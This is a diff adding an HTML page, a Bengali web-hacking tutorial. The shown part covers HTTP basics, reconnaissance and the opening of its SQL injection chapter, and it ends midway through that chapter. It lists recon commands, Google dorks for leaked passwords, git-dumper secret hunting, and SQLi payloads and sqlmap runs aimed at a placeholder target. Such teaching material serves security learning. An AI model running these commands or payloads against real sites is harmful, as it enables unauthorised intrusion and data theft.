@@ -1,0 +1,2009 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Application Hacking — সম্পূর্ণ বাংলা গাইড</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Noto+Sans+Bengali:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --primary: #0f0e17;
+  --secondary: #1a1a2e;
+  --accent: #ff6b35;
+  --accent2: #e94560;
+  --green: #06d6a0;
+  --blue: #118ab2;
+  --purple: #9b5de5;
+  --yellow: #ffd166;
+  --red: #ef233c;
+  --code-bg: #0d1117;
+  --text: #1a1a2e;
+  --bg: #f0f4f8;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Hind Siliguri','Noto Sans Bengali',sans-serif; background:var(--bg); color:var(--text); font-size:14px; line-height:1.9; }
+
+/* PRINT BUTTON */
+.print-btn { position:fixed; top:20px; right:20px; background:var(--accent2); color:white; border:none; padding:12px 24px; border-radius:8px; font-size:15px; font-family:inherit; cursor:pointer; z-index:9999; box-shadow:0 4px 15px rgba(233,69,96,0.4); }
+.print-btn:hover { background:#c1121f; }
+
+/* COVER */
+.cover { background:linear-gradient(135deg, #0f0e17 0%, #1a1a2e 50%, #16213e 100%); color:white; min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:60px 40px; page-break-after:always; position:relative; overflow:hidden; }
+.cover::before { content:''; position:absolute; inset:0; background:radial-gradient(ellipse at 20% 50%, rgba(255,107,53,0.08) 0%, transparent 60%), radial-gradient(ellipse at 80% 20%, rgba(233,69,96,0.08) 0%, transparent 60%); }
+.cover-icon { font-size:85px; margin-bottom:15px; position:relative; }
+.cover h1 { font-size:40px; font-weight:700; background:linear-gradient(135deg, #ff6b35, #e94560); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; }
+.cover h2 { font-size:20px; color:rgba(255,255,255,0.75); margin:10px 0 25px; }
+.cover .divider { width:100px; height:3px; background:linear-gradient(90deg, #ff6b35, #e94560); margin:15px auto; border-radius:2px; }
+.cover .desc { font-size:15px; color:rgba(255,255,255,0.65); max-width:650px; line-height:2; }
+.cover .term { background:rgba(0,0,0,0.5); border:1px solid rgba(255,107,53,0.3); border-radius:10px; padding:18px 28px; margin-top:28px; font-family:'Courier New',monospace; font-size:13px; color:var(--green); text-align:left; max-width:520px; }
+.cover .badges { margin-top:25px; display:flex; flex-wrap:wrap; justify-content:center; gap:8px; }
+.cover .badge { background:rgba(255,107,53,0.12); border:1px solid rgba(255,107,53,0.3); padding:5px 15px; border-radius:20px; font-size:12.5px; color:#ffd3b6; }
+
+/* TOC */
+.toc { background:white; padding:50px 60px; page-break-after:always; }
+.toc-hdr { font-size:28px; color:var(--primary); border-bottom:4px solid var(--accent); padding-bottom:12px; margin-bottom:30px; }
+.toc-main { display:flex; justify-content:space-between; padding:10px 0; font-weight:700; font-size:15.5px; color:var(--primary); border-bottom:1px solid #eee; margin-top:12px; }
+.toc-main .n { color:var(--accent); margin-right:10px; font-family:'Courier New',monospace; }
+.toc-sub { padding:4px 0 4px 28px; color:#666; font-size:13px; border-bottom:1px dotted #f0f0f0; }
+
+/* CHAPTERS */
+.chapter { background:white; page-break-before:always; }
+.ch-hdr { padding:38px 55px; position:relative; overflow:hidden; }
+.ch1 .ch-hdr { background:linear-gradient(135deg,#0f0e17,#1a1a2e); }
+.ch2 .ch-hdr { background:linear-gradient(135deg,#1a0a00,#3d1a00); }
+.ch3 .ch-hdr { background:linear-gradient(135deg,#0a0a1a,#1a1a4f); }
+.ch4 .ch-hdr { background:linear-gradient(135deg,#0a1a0a,#1a3d1a); }
+.ch5 .ch-hdr { background:linear-gradient(135deg,#1a0a1a,#4a0d4a); }
+.ch6 .ch-hdr { background:linear-gradient(135deg,#1a1a00,#3d3d00); }
+.ch7 .ch-hdr { background:linear-gradient(135deg,#0a1a1a,#1a3d3d); }
+.ch8 .ch-hdr { background:linear-gradient(135deg,#1a0000,#4a0000); }
+.ch9 .ch-hdr { background:linear-gradient(135deg,#0f0e17,#2d1b69); }
+.ch10 .ch-hdr { background:linear-gradient(135deg,#001a0a,#004a1a); }
+.ch11 .ch-hdr { background:linear-gradient(135deg,#1a1000,#4a2d00); }
+.ch12 .ch-hdr { background:linear-gradient(135deg,#0a0a2a,#1a1a4a); }
+
+.ch-label { font-size:11px; letter-spacing:4px; color:var(--accent); text-transform:uppercase; margin-bottom:8px; }
+.ch-title { font-size:28px; color:white; font-weight:700; }
+.ch-desc { font-size:13px; color:rgba(255,255,255,0.55); margin-top:6px; }
+.ch-body { padding:38px 55px; }
+
+/* HEADINGS */
+h2.s { font-size:21px; color:var(--primary); margin:32px 0 14px; padding-left:16px; border-left:5px solid var(--accent); }
+h3.ss { font-size:17px; color:#1a1a2e; margin:22px 0 10px; padding-bottom:5px; border-bottom:2px dashed #e0e0e0; }
+h4.m { font-size:14.5px; color:#333; margin:15px 0 7px; font-weight:700; }
+p { margin-bottom:13px; text-align:justify; }
+
+/* CODE */
+.code { background:var(--code-bg); color:#c9d1d9; padding:18px 22px; border-radius:10px; font-family:'Courier New',monospace; font-size:12.5px; margin:16px 0; line-height:1.85; overflow-x:auto; border:1px solid #30363d; border-left:4px solid var(--accent); }
+.c { color:#6e7681; }
+.g { color:#06d6a0; }
+.y { color:#e3b341; }
+.r { color:#ff7b72; }
+.b { color:#79c0ff; }
+.p { color:#f0883e; }
+.w { color:#ffffff; }
+code { background:#1e2a3a; color:#79c0ff; padding:2px 7px; border-radius:4px; font-family:'Courier New',monospace; font-size:12.5px; }
+
+/* BOXES */
+.box { padding:16px 20px; border-radius:9px; margin:18px 0; border-left:5px solid; }
+.bi { background:#e8f4fd; border-color:var(--blue); color:#023e8a; }
+.bw { background:#fff8e6; border-color:var(--accent); color:#7b3f00; }
+.bd { background:#fde8ea; border-color:var(--red); color:#9b1d20; }
+.bs { background:#e8f8f0; border-color:var(--green); color:#064e3b; }
+.bp { background:#f3e8ff; border-color:var(--purple); color:#4a0072; }
+.bt { font-weight:700; margin-bottom:7px; font-size:14.5px; }
+
+/* TABLES */
+table { width:100%; border-collapse:collapse; margin:18px 0; font-size:13px; }
+thead tr { background:var(--primary); color:white; }
+th { padding:11px 14px; text-align:left; font-weight:600; }
+td { padding:9px 14px; border-bottom:1px solid #eee; }
+tr:nth-child(even) { background:#f8f9fa; }
+
+/* DIAGRAM */
+.dg { background:#0d1117; border:1px solid #30363d; border-radius:10px; padding:20px 22px; font-family:'Courier New',monospace; font-size:12.5px; line-height:1.85; margin:18px 0; color:#c9d1d9; overflow-x:auto; }
+.dg .dg { color:var(--green); }
+.dg .dy { color:#e3b341; }
+.dg .db { color:#79c0ff; }
+.dg .dr { color:#ff7b72; }
+
+/* GRID */
+.g2 { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin:16px 0; }
+.g3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:14px; margin:16px 0; }
+.card { background:#f8f9fa; border:1px solid #e0e0e0; border-radius:9px; padding:16px; }
+.card h4 { font-size:14px; margin-bottom:8px; padding-bottom:5px; border-bottom:2px solid var(--accent); color:var(--primary); }
+.card.dc { border-color:var(--red); }
+.card.dc h4 { color:var(--red); border-color:var(--red); }
+.card.sc { border-color:var(--green); }
+.card.sc h4 { color:#064e3b; border-color:var(--green); }
+.card.pc { border-color:var(--purple); }
+.card.pc h4 { color:var(--purple); border-color:var(--purple); }
+
+ul,ol { margin:10px 0 10px 24px; line-height:2; }
+li { margin-bottom:3px; }
+
+.summary { background:linear-gradient(135deg,#0f0e17,#1a1a2e); color:white; border-radius:12px; padding:24px 28px; margin-top:35px; }
+.summary h3 { color:var(--accent); margin-bottom:12px; font-size:17px; }
+.summary li { color:rgba(255,255,255,0.82); margin-bottom:5px; }
+
+.vuln-tag { display:inline-block; padding:2px 10px; border-radius:12px; font-size:11.5px; font-weight:700; margin:2px; }
+.vt-c { background:#fde8ea; color:#c1121f; }
+.vt-h { background:#fff3cd; color:#856404; }
+.vt-m { background:#cfe2ff; color:#084298; }
+.vt-g { background:#d1e7dd; color:#0f5132; }
+
+@media print {
+  .print-btn { display:none; }
+  body { background:white; }
+  .ch-hdr,.cover,thead tr,.code,.dg { -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+}
+</style>
+</head>
+<body>
+<button class="print-btn" onclick="window.print()">🖨️ PDF সেভ করুন</button>
+
+<!-- ══ COVER ══ -->
+<div class="cover">
+  <div class="cover-icon">🌐</div>
+  <h1>Web Application Hacking</h1>
+  <h2>ওয়েব হ্যাকিং — সম্পূর্ণ বাংলা গাইড</h2>
+  <div class="divider"></div>
+  <p class="desc">SQL Injection থেকে শুরু করে SSRF, IDOR, XXE, SSTI, OAuth Bypass — OWASP Top 10 ও তার বাইরে সব ওয়েব ভালনারেবিলিটি বিস্তারিত।</p>
+  <div class="term">
+    <div><span style="color:#79c0ff">hacker@kali</span>:~# sqlmap -u "http://target.com/?id=1" --dbs</div>
+    <div style="color:#06d6a0">[*] available databases [3]:</div>
+    <div style="color:#06d6a0">[*] users_db &nbsp; [*] admin &nbsp; [*] secrets</div>
+    <div style="margin-top:8px"><span style="color:#79c0ff">hacker@kali</span>:~# <span style="animation:blink 1s infinite">█</span></div>
+  </div>
+  <div class="badges">
+    <span class="badge">💉 SQL Injection</span>
+    <span class="badge">📜 XSS</span>
+    <span class="badge">🔄 CSRF</span>
+    <span class="badge">🔍 IDOR</span>
+    <span class="badge">🌐 SSRF</span>
+    <span class="badge">📁 XXE</span>
+    <span class="badge">🔓 Auth Bypass</span>
+    <span class="badge">⚙️ SSTI</span>
+    <span class="badge">📂 File Upload</span>
+    <span class="badge">🔑 JWT Attacks</span>
+    <span class="badge">🛠️ Burp Suite</span>
+    <span class="badge">🏆 CTF Tips</span>
+  </div>
+</div>
+
+<!-- ══ TOC ══ -->
+<div class="toc">
+  <div class="toc-hdr">📋 বিষয়সূচি</div>
+
+  <div class="toc-main"><span><span class="n">01</span> ওয়েব অ্যাপ্লিকেশন ফান্ডামেন্টাল</span></div>
+  <div class="toc-sub">HTTP/HTTPS বিস্তারিত, Request/Response, Status Code, Cookie, Session</div>
+
+  <div class="toc-main"><span><span class="n">02</span> Reconnaissance — টার্গেট সম্পর্কে জানা</span></div>
+  <div class="toc-sub">Subdomain, Directory, Technology Stack, Burp Suite Setup</div>
+
+  <div class="toc-main"><span><span class="n">03</span> SQL Injection — সম্পূর্ণ গাইড</span></div>
+  <div class="toc-sub">Error-based, Blind, Time-based, Union-based, SQLmap, WAF Bypass</div>
+
+  <div class="toc-main"><span><span class="n">04</span> XSS — Cross-Site Scripting</span></div>
+  <div class="toc-sub">Reflected, Stored, DOM-based, Cookie Stealing, Payload তালিকা, Bypass</div>
+
+  <div class="toc-main"><span><span class="n">05</span> IDOR ও Access Control</span></div>
+  <div class="toc-sub">IDOR বিস্তারিত, Horizontal/Vertical Escalation, Business Logic</div>
+
+  <div class="toc-main"><span><span class="n">06</span> CSRF — Cross-Site Request Forgery</span></div>
+  <div class="toc-sub">CSRF কীভাবে কাজ করে, Exploit তৈরি, Bypass, SameSite</div>
+
+  <div class="toc-main"><span><span class="n">07</span> SSRF — Server-Side Request Forgery</span></div>
+  <div class="toc-sub">Basic SSRF, Cloud Metadata, Blind SSRF, Filter Bypass</div>
+
+  <div class="toc-main"><span><span class="n">08</span> File Upload ও Path Traversal</span></div>
+  <div class="toc-sub">Webshell Upload, Extension Bypass, LFI/RFI, Path Traversal</div>
+
+  <div class="toc-main"><span><span class="n">09</span> Authentication Attacks</span></div>
+  <div class="toc-sub">Brute Force, JWT Attack, OAuth Bypass, Password Reset, 2FA Bypass</div>
+
+  <div class="toc-main"><span><span class="n">10</span> XXE, SSTI ও Deserialization</span></div>
+  <div class="toc-sub">XXE বিস্তারিত, Template Injection, Object Deserialization</div>
+
+  <div class="toc-main"><span><span class="n">11</span> Burp Suite — সম্পূর্ণ গাইড</span></div>
+  <div class="toc-sub">Proxy, Repeater, Intruder, Scanner, Extensions</div>
+
+  <div class="toc-main"><span><span class="n">12</span> WAF Bypass ও Advanced Techniques</span></div>
+  <div class="toc-sub">WAF Bypass, Race Condition, HTTP Smuggling, Cache Poisoning</div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 1: ওয়েব ফান্ডামেন্টাল
+══════════════════════════════════════ -->
+<div class="chapter ch1">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 01</div>
+    <div class="ch-title">🌐 ওয়েব অ্যাপ্লিকেশন ফান্ডামেন্টাল</div>
+    <div class="ch-desc">HTTP, Cookie, Session — হ্যাকিংয়ের আগে যা বুঝতেই হবে</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">HTTP কীভাবে কাজ করে?</h2>
+    <p>HTTP (HyperText Transfer Protocol) হলো ওয়েব ব্রাউজার ও সার্ভারের মধ্যে যোগাযোগের ভাষা। প্রতিটি ওয়েব Request ও Response একটি নির্দিষ্ট কাঠামো মেনে চলে।</p>
+
+    <div class="dg">
+<pre>তুমি browser-এ https://example.com/login লিখলে:
+
+<span class="db">CLIENT (Browser)</span>                    <span class="db">SERVER</span>
+       │                                   │
+       │──── DNS Lookup ──────────────────→│ example.com = 93.184.216.34
+       │                                   │
+       │──── TCP Handshake (3-way) ───────→│
+       │←─── SYN-ACK ─────────────────────│
+       │──── ACK ────────────────────────→│
+       │                                   │
+       │──── TLS Handshake ──────────────→│ (HTTPS)
+       │←─── Certificate + Session Key ───│
+       │                                   │
+       │──── HTTP GET /login ────────────→│
+       │←─── HTTP 200 OK + HTML ──────────│
+       │                                   │
+</pre>
+    </div>
+
+    <h2 class="s">HTTP Request বিস্তারিত</h2>
+    <div class="code">
+<span class="c"># HTTP Request Structure</span>
+<span class="g">POST /login HTTP/1.1</span>                          <span class="c">← Method + Path + Version</span>
+<span class="y">Host: example.com</span>                             <span class="c">← সার্ভারের নাম</span>
+<span class="y">User-Agent: Mozilla/5.0 (Windows NT 10.0)</span>    <span class="c">← Browser তথ্য</span>
+<span class="y">Accept: text/html,application/xhtml+xml</span>       <span class="c">← কী ধরনের response চাই</span>
+<span class="y">Content-Type: application/x-www-form-urlencoded</span> <span class="c">← Body-র format</span>
+<span class="y">Content-Length: 27</span>                            <span class="c">← Body-র size</span>
+<span class="y">Cookie: session=abc123xyz</span>                     <span class="c">← ⭐ Session cookie</span>
+<span class="y">Authorization: Bearer eyJhbGci...</span>             <span class="c">← JWT Token</span>
+<span class="y">Referer: https://example.com/</span>                <span class="c">← কোথা থেকে এলো</span>
+<span class="y">X-Forwarded-For: 192.168.1.1</span>                 <span class="c">← ⭐ IP Spoofing সম্ভব!</span>
+                                               <span class="c">← খালি লাইন (header শেষ)</span>
+<span class="p">username=admin&password=1234</span>                  <span class="c">← Body (POST data)</span>
+    </div>
+
+    <h2 class="s">HTTP Methods</h2>
+    <table>
+      <thead><tr><th>Method</th><th>কাজ</th><th>সিকিউরিটি প্রাসঙ্গিকতা</th></tr></thead>
+      <tbody>
+        <tr><td><code>GET</code></td><td>Data পড়া</td><td>URL-এ sensitive data → Log-এ থাকে, Cache হয়</td></tr>
+        <tr><td><code>POST</code></td><td>Data পাঠানো</td><td>Form submit, Login — Body-তে data</td></tr>
+        <tr><td><code>PUT</code></td><td>Resource আপডেট</td><td>Authorization ছাড়া থাকলে file overwrite</td></tr>
+        <tr><td><code>DELETE</code></td><td>Resource মুছা</td><td>IDOR + DELETE = অন্যের data মুছা</td></tr>
+        <tr><td><code>PATCH</code></td><td>আংশিক আপডেট</td><td>Mass Assignment সম্ভব</td></tr>
+        <tr><td><code>OPTIONS</code></td><td>কী কী Method আছে?</td><td>অনুমতিপ্রাপ্ত Method জানা যায়</td></tr>
+        <tr><td><code>HEAD</code></td><td>শুধু Header</td><td>Server তথ্য সংগ্রহ</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s">HTTP Response ও Status Code</h2>
+    <div class="code">
+<span class="c"># HTTP Response Structure</span>
+<span class="g">HTTP/1.1 200 OK</span>                           <span class="c">← Status Line</span>
+<span class="y">Content-Type: text/html; charset=UTF-8</span>   <span class="c">← Response format</span>
+<span class="y">Server: Apache/2.4.41</span>                    <span class="c">← ⚠️ সার্ভার তথ্য ফাঁস!</span>
+<span class="y">X-Powered-By: PHP/7.4.3</span>                  <span class="c">← ⚠️ Technology ফাঁস!</span>
+<span class="y">Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Strict</span>
+<span class="y">X-Frame-Options: DENY</span>                    <span class="c">← Clickjacking সুরক্ষা</span>
+<span class="y">X-XSS-Protection: 1; mode=block</span>
+<span class="y">Content-Security-Policy: default-src 'self'</span>
+                                          <span class="c">← খালি লাইন</span>
+<span class="p">&lt;html&gt;...&lt;/html&gt;</span>                         <span class="c">← Body</span>
+    </div>
+
+    <table>
+      <thead><tr><th>Status Code</th><th>অর্থ</th><th>হ্যাকিং প্রাসঙ্গিকতা</th></tr></thead>
+      <tbody>
+        <tr><td><strong>200</strong></td><td>OK — সফল</td><td>সফল request</td></tr>
+        <tr><td><strong>301/302</strong></td><td>Redirect</td><td>Open Redirect সম্ভব</td></tr>
+        <tr><td><strong>400</strong></td><td>Bad Request</td><td>Payload ভুল ফরম্যাটে</td></tr>
+        <tr><td><strong>401</strong></td><td>Unauthorized</td><td>Authentication দরকার</td></tr>
+        <tr><td><strong>403</strong></td><td>Forbidden</td><td>Access নেই — Bypass চেষ্টা করো</td></tr>
+        <tr><td><strong>404</strong></td><td>Not Found</td><td>Directory brute force-এ কাজে লাগে</td></tr>
+        <tr><td><strong>500</strong></td><td>Server Error</td><td>⭐ Error message-এ সার্ভার তথ্য</td></tr>
+        <tr><td><strong>503</strong></td><td>Service Unavailable</td><td>DDoS সফল হয়েছে</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s">Cookie ও Session বিস্তারিত</h2>
+    <p>HTTP Stateless — প্রতিটি request আলাদা। Cookie ও Session ব্যবহার করে "কে login আছে" মনে রাখা হয়।</p>
+
+    <div class="dg">
+<pre><span class="dy">Login Process:</span>
+Browser                          Server
+   │                                │
+   │──── POST /login ──────────────→│
+   │     username=admin&pass=1234   │
+   │                                │ ✓ Valid credentials
+   │←─── 200 OK ────────────────────│
+   │     Set-Cookie: session=abc123 │ ← Session তৈরি
+   │                                │
+   │──── GET /dashboard ───────────→│
+   │     Cookie: session=abc123     │ ← "আমি admin"
+   │←─── 200 OK (Dashboard) ────────│ ← সার্ভার চিনতে পারল
+   │                                │
+<span class="dr">Session Hijacking:</span>
+Hacker Cookie: session=abc123 পেলে → সরাসরি dashboard access!</pre>
+    </div>
+
+    <h3 class="ss">Cookie Flags — সিকিউরিটি</h3>
+    <table>
+      <thead><tr><th>Flag</th><th>কাজ</th><th>না থাকলে ঝুঁকি</th></tr></thead>
+      <tbody>
+        <tr><td><code>HttpOnly</code></td><td>JavaScript দিয়ে পড়া যাবে না</td><td>XSS দিয়ে Cookie চুরি সম্ভব</td></tr>
+        <tr><td><code>Secure</code></td><td>শুধু HTTPS-এ পাঠাবে</td><td>HTTP-তে Cookie intercept সম্ভব</td></tr>
+        <tr><td><code>SameSite=Strict</code></td><td>অন্য সাইট থেকে পাঠাবে না</td><td>CSRF attack সম্ভব</td></tr>
+        <tr><td><code>Expires</code></td><td>কতক্ষণ Valid</td><td>অনির্দিষ্টকাল valid থাকলে ঝুঁকি</td></tr>
+        <tr><td><code>Path=/</code></td><td>কোন path-এ পাঠাবে</td><td>সব path-এ cookie যায়</td></tr>
+        <tr><td><code>Domain</code></td><td>কোন domain-এ</td><td>Subdomain-এও যেতে পারে</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s">OWASP Top 10 — ২০২১</h2>
+    <table>
+      <thead><tr><th>#</th><th>ভালনারেবিলিটি</th><th>উদাহরণ</th><th>বিপদের মাত্রা</th></tr></thead>
+      <tbody>
+        <tr><td>A01</td><td>Broken Access Control</td><td>IDOR, Privilege Escalation</td><td><span class="vuln-tag vt-c">Critical</span></td></tr>
+        <tr><td>A02</td><td>Cryptographic Failures</td><td>HTTP, MD5 Password, Weak Cipher</td><td><span class="vuln-tag vt-c">Critical</span></td></tr>
+        <tr><td>A03</td><td>Injection</td><td>SQL, NoSQL, Command Injection</td><td><span class="vuln-tag vt-c">Critical</span></td></tr>
+        <tr><td>A04</td><td>Insecure Design</td><td>Business Logic Flaw</td><td><span class="vuln-tag vt-h">High</span></td></tr>
+        <tr><td>A05</td><td>Security Misconfiguration</td><td>Default Creds, Open Admin</td><td><span class="vuln-tag vt-h">High</span></td></tr>
+        <tr><td>A06</td><td>Vulnerable Components</td><td>Outdated Library/Plugin</td><td><span class="vuln-tag vt-h">High</span></td></tr>
+        <tr><td>A07</td><td>Auth & Session Management</td><td>Weak Session, Brute Force</td><td><span class="vuln-tag vt-h">High</span></td></tr>
+        <tr><td>A08</td><td>Software Data Integrity</td><td>Insecure Deserialization</td><td><span class="vuln-tag vt-h">High</span></td></tr>
+        <tr><td>A09</td><td>Security Logging Failures</td><td>No logging, Log Injection</td><td><span class="vuln-tag vt-m">Medium</span></td></tr>
+        <tr><td>A10</td><td>SSRF</td><td>Internal Service Access</td><td><span class="vuln-tag vt-c">Critical</span></td></tr>
+      </tbody>
+    </table>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 2: Reconnaissance
+══════════════════════════════════════ -->
+<div class="chapter ch2">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 02</div>
+    <div class="ch-title">🔍 Web Reconnaissance — টার্গেট বিশ্লেষণ</div>
+    <div class="ch-desc">Attack শুরুর আগে যতটুকু জানা যায় জানো</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">Passive Reconnaissance</h2>
+    <div class="code">
+<span class="c"># Technology Stack চেনা</span>
+<span class="c"># Wappalyzer browser extension — সবচেয়ে সহজ</span>
+whatweb https://target.com          <span class="c"># CLI টুল</span>
+curl -I https://target.com          <span class="c"># Response Header দেখা</span>
+
+<span class="c"># Subdomain Discovery</span>
+subfinder -d target.com -o subs.txt
+amass enum -passive -d target.com
+assetfinder --subs-only target.com
+curl https://crt.sh/?q=%.target.com&output=json | jq '.[].name_value'
+
+<span class="c"># DNS তথ্য</span>
+dig target.com ANY
+dig @8.8.8.8 target.com MX
+dnsrecon -d target.com
+dnsenum target.com
+
+<span class="c"># Google Dorking — সবচেয়ে শক্তিশালী</span>
+site:target.com                     <span class="c"># সব index হওয়া page</span>
+site:target.com filetype:pdf        <span class="c"># PDF ফাইল</span>
+site:target.com inurl:admin         <span class="c"># Admin page</span>
+site:target.com "DB_PASSWORD"       <span class="c"># Exposed config</span>
+site:target.com ext:php inurl:?id=  <span class="c"># PHP parameter</span>
+"target.com" filetype:sql           <span class="c"># Database dump</span>
+inurl:target.com intext:"password"  <span class="c"># Password leak</span>
+    </div>
+
+    <h2 class="s">Active Reconnaissance</h2>
+    <div class="code">
+<span class="c"># Directory ও File Brute Force</span>
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt
+feroxbuster -u https://target.com --depth 3
+ffuf -w wordlist.txt -u https://target.com/FUZZ
+dirsearch -u https://target.com -e php,html,js
+
+<span class="c"># গুরুত্বপূর্ণ ফাইল চেক করো সরাসরি:</span>
+/robots.txt          <span class="c"># লুকানো path তালিকা</span>
+/.env                <span class="c"># Environment variables (DB password!)</span>
+/.git/               <span class="c"># Source code!</span>
+/sitemap.xml         <span class="c"># সব URL</span>
+/admin               <span class="c"># Admin panel</span>
+/wp-admin            <span class="c"># WordPress admin</span>
+/phpmyadmin          <span class="c"># Database admin</span>
+/backup.zip          <span class="c"># Backup file</span>
+/config.php.bak      <span class="c"># Config backup</span>
+/api/v1/users        <span class="c"># API endpoint</span>
+
+<span class="c"># Parameter Discovery</span>
+arjun -u https://target.com/search  <span class="c"># Hidden parameter</span>
+ffuf -w params.txt -u https://target.com/page?FUZZ=test
+
+<span class="c"># JavaScript Analysis</span>
+<span class="c"># Browser DevTools → Sources → সব JS ফাইল খোঁজো</span>
+<span class="c"># API endpoints, secret keys প্রায়ই JS-এ থাকে</span>
+linkfinder.py -i https://target.com/app.js -o cli
+    </div>
+
+    <h2 class="s">Burp Suite Setup — সবচেয়ে গুরুত্বপূর্ণ টুল</h2>
+    <div class="code">
+<span class="c"># Burp Suite চালু করা</span>
+burpsuite &     <span class="c"># Kali Linux-এ</span>
+
+<span class="c"># Browser Proxy Setup:</span>
+<span class="c"># Firefox → Settings → Network → Manual Proxy:</span>
+<span class="c"># HTTP Proxy: 127.0.0.1  Port: 8080</span>
+
+<span class="c"># Certificate Install (HTTPS intercept করতে):</span>
+<span class="c"># http://burpsuite → CA Certificate download</span>
+<span class="c"># Firefox → Settings → View Certificates → Import</span>
+
+<span class="c"># ⭐ FoxyProxy Extension ব্যবহার করলে সহজ!</span>
+    </div>
+
+    <h3 class="ss">Burp Suite এর প্রধান Tools</h3>
+    <table>
+      <thead><tr><th>Tool</th><th>কাজ</th><th>কখন ব্যবহার করবে</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Proxy</strong></td><td>Request intercept ও modify</td><td>সব সময়</td></tr>
+        <tr><td><strong>Repeater</strong></td><td>Request বারবার পাঠানো</td><td>SQLi, XSS manual testing</td></tr>
+        <tr><td><strong>Intruder</strong></td><td>Automated brute force</td><td>Fuzzing, Password attack</td></tr>
+        <tr><td><strong>Scanner</strong></td><td>Auto vulnerability scan</td><td>Quick initial scan (Pro)</td></tr>
+        <tr><td><strong>Decoder</strong></td><td>Encode/Decode</td><td>Base64, URL, HTML decode</td></tr>
+        <tr><td><strong>Comparer</strong></td><td>দুটো response তুলনা</td><td>Blind SQLi detect</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s">Information Disclosure খোঁজা</h2>
+    <div class="code">
+<span class="c"># Error Message থেকে তথ্য</span>
+<span class="c"># PHP Error:</span>
+<span class="r">Warning: mysqli_connect(): php_network_getaddresses: getaddrinfo failed</span>
+<span class="c"># MySQL Error:</span>
+<span class="r">You have an error in your SQL syntax near '' at line 1</span>
+<span class="c"># Stack Trace:</span>
+<span class="r">at com.example.app.UserService.getUser(UserService.java:45)</span>
+
+<span class="c"># ⭐ এই Error গুলো দেখলে মানে SQLi/Injection সম্ভব!</span>
+
+<span class="c"># .git expose হলে Source Code বের করা</span>
+git-dumper https://target.com/.git/ ./repo
+cd repo && git log --oneline  <span class="c"># Commit history</span>
+git show HEAD                  <span class="c"># সর্বশেষ পরিবর্তন</span>
+grep -r "password\|secret\|key" ./  <span class="c"># Secret খোঁজা</span>
+
+<span class="c"># JS Source Map থেকে Source Code</span>
+<span class="c"># app.js.map ফাইল থাকলে মূল source code পাওয়া যায়</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 3: SQL Injection
+══════════════════════════════════════ -->
+<div class="chapter ch3">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 03</div>
+    <div class="ch-title">💉 SQL Injection — সম্পূর্ণ গাইড</div>
+    <div class="ch-desc">সবচেয়ে বিপজ্জনক ও সবচেয়ে বেশি পাওয়া যায় এমন ভালনারেবিলিটি</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">SQL Injection কী?</h2>
+    <p>SQL Injection হলো এমন একটি আক্রমণ যেখানে ইনপুটের মধ্যে SQL কোড ঢুকিয়ে ডেটাবেসকে অন্যভাবে কাজ করানো হয়।</p>
+
+    <div class="dg">
+<pre><span class="dy">স্বাভাবিক Query:</span>
+SELECT * FROM users WHERE username='admin' AND password='1234'
+                                 <span class="dg">↑ ইউজার input এখানে যায়</span>
+
+<span class="dr">SQL Injection Input:</span>  admin' OR '1'='1
+<span class="dr">তৈরি হওয়া Query:</span>
+SELECT * FROM users WHERE username='admin' <span class="dr">OR '1'='1'</span> AND password='xxx'
+                                                    <span class="dg">↑ সবসময় True!</span>
+Result: সব user-এর data বের হয়ে আসে!
+</pre>
+    </div>
+
+    <h2 class="s">SQL Injection Detection</h2>
+    <div class="code">
+<span class="c"># প্রথমে Error trigger করো:</span>
+'                        <span class="c"># Single quote → Syntax error</span>
+''                       <span class="c"># Double quote</span>
+`                        <span class="c"># Backtick</span>
+')                       <span class="c"># Closing parenthesis</span>
+1=1                      <span class="c"># Boolean test</span>
+1=2                      <span class="c"># False test</span>
+
+<span class="c"># উদাহরণ:</span>
+https://target.com/product?id=1'
+<span class="r">You have an error in your SQL syntax...  ← SQLi পাওয়া গেছে!</span>
+
+<span class="c"># Boolean-based detection:</span>
+https://target.com/product?id=1 AND 1=1   <span class="c"># সব ঠিক আছে (True)</span>
+https://target.com/product?id=1 AND 1=2   <span class="c"># Page ভিন্ন হলে SQLi আছে!</span>
+
+<span class="c"># Time-based detection:</span>
+https://target.com/product?id=1; WAITFOR DELAY '0:0:5'  <span class="c"># MSSQL</span>
+https://target.com/product?id=1 AND SLEEP(5)             <span class="c"># MySQL</span>
+<span class="c"># যদি ৫ সেকেন্ড দেরি হয় → Time-based SQLi আছে!</span>
+    </div>
+
+    <h2 class="s">SQLi প্রকারভেদ ও Exploitation</h2>
+
+    <h3 class="ss">১. In-band SQLi — Error-based</h3>
+    <div class="code">
+<span class="c"># MySQL Error-based</span>
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--
+
+<span class="c"># Result:</span>
+<span class="r">XPATH syntax error: '~8.0.26~'   ← Database version!</span>
+    </div>
+
